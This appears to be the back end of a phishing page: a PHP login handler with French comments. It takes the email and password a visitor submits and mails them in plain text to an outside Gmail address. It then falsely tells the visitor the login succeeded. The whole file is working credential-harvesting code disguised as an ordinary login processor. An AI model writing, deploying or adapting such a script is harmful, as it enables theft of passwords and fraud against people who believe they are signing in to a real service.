process_login.php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les informations soumises par le formulaire
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Définir les paramètres de l'e-mail
    $to = "bourses.familiales.services@gmail.com"; // Remplacez par votre adresse email
    $subject = "Nouvelle connexion à votre site";
    $message = "Un utilisateur s'est connecté avec les informations suivantes :\n\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Mot de passe: " . $password . "\n";

    // Entêtes de l'e-mail
    $headers = "From: no-reply@votresite.com" . "\r\n" . 
               "Reply-To: no-reply@votresite.com" . "\r\n" . 
               "X-Mailer: PHP/" . phpversion();

    // Envoyer l'e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "Connexion réussie. Vous recevrez un e-mail.";
    } else {
        echo "Erreur dans l'envoi de l'e-mail.";
    }
    } else {
    echo "Aucune donnée reçue.";
}
?>